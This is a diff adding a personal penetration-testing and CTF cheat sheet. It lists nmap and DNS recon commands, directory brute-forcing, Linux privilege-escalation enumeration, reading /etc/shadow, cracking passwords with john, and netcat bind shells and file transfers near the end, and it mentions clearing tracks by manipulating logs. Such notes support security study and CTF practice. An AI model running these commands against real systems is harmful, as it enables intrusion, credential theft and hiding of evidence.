@@ -1,0 +1,205 @@
+The Phase Of a Attack : Recon -> Scanning -> Gaining Access -> Maintaining Access -> Clearing Tracks
+
+Recon : Passive Discovery, Active Discovery
+Scanning : Port Scanning, Enumeration, Vulnerability Scanning
+Gaining Access : Password Cracking, Code injection, Buffer Overflow, Session Hijacking etc
+Maintaing Access : Backdoors, Privliege Escalation, Lateral Movement, Rootkits
+Clearing Tracks : Delete logfiles, Deactivate Auditing, Manipulate Logs
+
+Resources:
+https://github.com/apsdehal/awesome-ctf
+https://github.com/devploit/awesome-ctf-resources
+
+Reconnaissance:
+
+21/tcp -> FTP
+22/tcp -> SSH
+25/tcp -> SMTP
+80/tcp -> HTTP
+443/tcp -> HTTPS
+445/tcp -> Samba
+
+ip addr show
+nmap -sn 127.0.0.1/24
+nmap 127.0.0.1
+nmap 127.0.0.1 -p 22,80,4444
+nmap 127.0.0.1 -p-
+nmap -sV 127.0.0.1 -p-
+nmap -sV 127.0.0.1 -p- -O
+nmap -sV 127.0.0.1 -p- -O -sC
+nmap -A 127.0.0.1 -p- --script=vuln
+
+ftp user@127.0.0.1
+nc 127.0.0.1 21
+telnet 127.0.0.1 21
+sudo ssh -i ubuntu@13.215.155.187
+sudo ssh -i vpss.pem ubuntu@13.215.155.187
+curl https://127.0.0.1
+curl https://127.0.0.1 -i 
+curl https://127.0.0.1 -v
+curl https://127.0.0.1 -I 
+curl https://127.0.0.1 -Iv
+curl https://127.0.0.1 -v -X POST
+curl https://127.0.0.1 -v -X POST -d '{"user":"zaber","password":"secret123"}'
+curl https://127.0.0.1 -v -X GET
+
+ssh user@127.0.0.1
+ssh bob@ssh.gulugulu.org -L 4444:www.example.com:80 [Local Port Forwarding]
+ssh bob@ssh.gulugulu.org -R 8080:127.0.0.1:1337 [Remote Port Forwarding]
+ssh bob@ssh.gulugulu.org -D 9000 -N -f [Dynamic Port Forwarding]
+
+dig www.abc.com
+dig www.abc.com AAAA
+dig www.abc.com TXT
+dig www.abc.com MX
+dig www.abc.com NS
+dig www.abc.com A
+dig -x 127.0.0.1
+
+nslookup example.com
+nslookup -query=MX example.com
+nslookup -query=TXT example.com
+nslookup example.com 8.8.8.8
+
+dnsrecon -d example.com
+dnsrecon -d example.com -D /usr/share/dnsrecon/subdomains-top1mil-5000.txt -t brt
+dnsrecon -d example.com -t axfr
+dnsrecon -r 192.168.1.0/24
+
+dnsenum example.com
+dnsenum --noreverse example.com
+dnsenum -f /usr/share/dnsenum/dns.txt example.com
+dnsenum --enum example.com
+
+whatweb https://192.168.1.1
+https://dnsdumpster.com/
+https://www.netcraft.com/search/
+
+cat /etc/hosts
+gobuster vhost -u http://cronos.htb -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -append-domain
+
+dirsearch -u 127.0.0.1 -w common.txt -e php
+dirb 127.0.0.1/ common.txt -X ".txt",".js"
+gobuster vhost -u 127.0.0.1 -w subdomain.txt 
+
+API:
+
+http Method:
+
+GET - Demand Resources from the server
+POST - Send data to the server
+OPTIONS - Ask for Available Options
+PUT - Set data on the server-side
+PATCH - After data on the server side
+DELETE - Delete data on the server side
+
+Example Of API Endpoints of RestFul API:
+https://www.abc.com/api/v3/users
+https://www.abc.com/api/v3/customers
+https://www.abc.com/api/v3/users/50
+https://www.abc.com/api/v3/users/50/settings
+
+you can change v1/v2/ etc 
+
+XML:
+<person>
+  <name>John Doe</name>
+  <age>30</age>
+  <email>john.doe@example.com</email>
+</person>
+
+JSON:
+{
+  "person": {
+    "name": "John Doe",
+    "age": 30,
+    "email": "john.doe@example.com"
+  }
+}
+
+YAML:
+person:
+  name: John Doe
+  age: 30
+  email: john.doe@example.com
+
+LPE:
+
+whoami
+ls -la
+ls -la .ssh
+less .zsh_history
+ls /home
+ls -la /tmp
+cat /etc/passwd
+cat /etc/passwd | grep -i sh$
+sudo -l
+find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null
+find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
+find / -perm /4000 2>/dev/null
+find / -perm /2000 2>/dev/null
+ps aux
+uname -a
+cat /etc/os-release
+ip a
+ss -tlpn
+
+cat /etc/passwd | cut -d
+cat /etc/passwd | cut -d ':' -f 1
+cat /etc/passwd | cut -d ':' -f 3
+cat /etc/passwd | cut -d ':' -f 4
+cat /etc/passwd | cut -d ':' -f 6
+cat /etc/passwd | cut -d ':' -f 7
+cat /etc/passwd | cut -d ':' -f 1,6
+cat /etc/passwd | cut -d ':' -f 1,7
+cat /etc/passwd | cut -d ':' -f 1-7
+cat /etc/passwd | cut -d ':' -f 1,3
+cat /etc/passwd | cut -d ':' -f 3,4
+cut -d ':' -f 1 /etc/passwd
+cat /etc/passwd | cut -d ':' -f 1,7 | grep "/bin/bash"
+
+cat /etc/shadow | cut -d ':' -f 1
+cat /etc/shadow | cut -d ':' -f 2
+cat /etc/shadow | cut -d ':' -f 3
+cat /etc/shadow | cut -d ':' -f 5
+cat /etc/shadow | cut -d ':' -f 6
+cat /etc/shadow | cut -d ':' -f 4
+cat /etc/shadow | cut -d ':' -f 1-9
+cat /etc/shadow | cut -d ':' -f 1,5
+cat /etc/shadow | cut -d ':' -f 1,6
+cat /etc/shadow | cut -d ':' -f 1,2,4
+cat /etc/shadow | cut -d ':' -f 1,3
+cat /etc/shadow | cut -d ':' -f 1,2,3,4,5,6,7,8,9
+cat /etc/shadow | cut -d ':' -f 1,2 | grep -v '::'
+cat /etc/shadow | cut -d ':' -f 1,2 | grep -E '::|^\*'
+cat /etc/shadow | cut -d ':' -f 1,3
+username:password:lastchg:min:max:warn:inactive:expire:reserved
+
+System Hacking:
+
+john --format=crypt --wordlist=/usr/share/wordlists/rockyou.txt shadow
+cd .john | cat john.pot
+ls *2john*
+
+
+Blind Shell: https://quickref.me/nc.html
+ip a
+python3 -m http.server
+
+nc -nlvp 4444    # (Kali Linux)
+nc 127.0.0.1 4444  # (Windows)
+
+nc -nlvp 4444 [cmd]
+nc 10.10.10.10 4444 [linux]
+
+nc -nlvp 4444 > wget.exe   # (Windows - Receiving File)
+nc 127.0.0.1 4444 < wget.exe  # (Windows - Sending File)
+
+nc -nlvp 4444 -e /usr/bin/bash   # (Kali Linux)
+nc 127.0.0.1 4444   # (Windows - Attacker Machine)
+
+Tutorial : https://www.youtube.com/watch?v=Wzc9cgEar7g
+
+
+
+
